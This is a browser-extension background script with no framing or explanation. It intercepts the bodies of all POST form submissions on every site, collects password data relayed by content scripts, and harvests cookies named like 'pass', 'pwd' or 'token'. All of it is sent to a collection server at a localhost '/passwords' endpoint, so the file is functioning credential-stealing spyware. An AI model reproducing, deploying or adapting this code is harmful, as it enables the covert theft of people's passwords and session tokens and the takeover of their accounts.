// Local server endpoint
const SERVER_URL = 'http://localhost:3000/passwords';

// Store active tabs
let activeTabs = new Set();

// Track when tabs are ready
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    activeTabs.add(tabId);
    setTimeout(() => {
      chrome.tabs.sendMessage(tabId, { action: "checkPasswords" })
        .catch(() => {
          // Tab not ready yet, ignore
        });
    }, 1000);
  }
});

chrome.tabs.onRemoved.addListener((tabId) => {
  activeTabs.delete(tabId);
});

// Monitor form submissions
chrome.webRequest.onBeforeRequest.addListener(
  function(details) {
    if (details.method === 'POST') {
      try {
        const url = new URL(details.url);
        
        // Extract form data if available
        if (details.requestBody) {
          let formData = null;
          
          if (details.requestBody.formData) {
            formData = details.requestBody.formData;
          } else if (details.requestBody.raw) {
            // Handle raw form data
            const decoder = new TextDecoder('utf-8');
            formData = details.requestBody.raw.map(item => {
              if (item.bytes) {
                return decoder.decode(item.bytes);
              }
              return item;
            });
          }
          
          const passwordData = {
            url: details.url,
            timestamp: new Date().toISOString(),
            method: 'POST',
            data: formData,
            type: 'form_submission'
          };
          
          // Send to local server
          sendToServer(passwordData);
        }
      } catch (error) {
        console.error('Error processing request:', error);
      }
    }
  },
  {
    urls: ["<all_urls>"],
    types: ["main_frame", "sub_frame"]
  },
  ["requestBody"]
);

// Listen for messages from content scripts
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "passwordDetected") {
    // Forward to server
    sendToServer(message.data);
    sendResponse({ status: "received" });
  }
  return true;
});

// Monitor cookies (with error handling)
try {
  chrome.cookies?.getAll({}, function(cookies) {
    if (cookies && !chrome.runtime.lastError) {
      cookies.forEach(cookie => {
        if (cookie.name.toLowerCase().includes('pass') || 
            cookie.name.toLowerCase().includes('pwd') ||
            cookie.name.toLowerCase().includes('token')) {
          sendToServer({
            type: 'cookie_password',
            url: cookie.domain,
            name: cookie.name,
            value: cookie.value,
            timestamp: new Date().toISOString()
          });
        }
      });
    }
  });
} catch (error) {
  console.log('Cookie access not available');
}

function sendToServer(data) {
  // Log to console for debugging
  console.log('Password detected:', data);
  
  // Send to local server
  fetch(SERVER_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data)
  })
  .then(response => response.json())
  .then(result => console.log('Server response:', result))
  .catch(err => console.log('Server not available:', err.message));
}
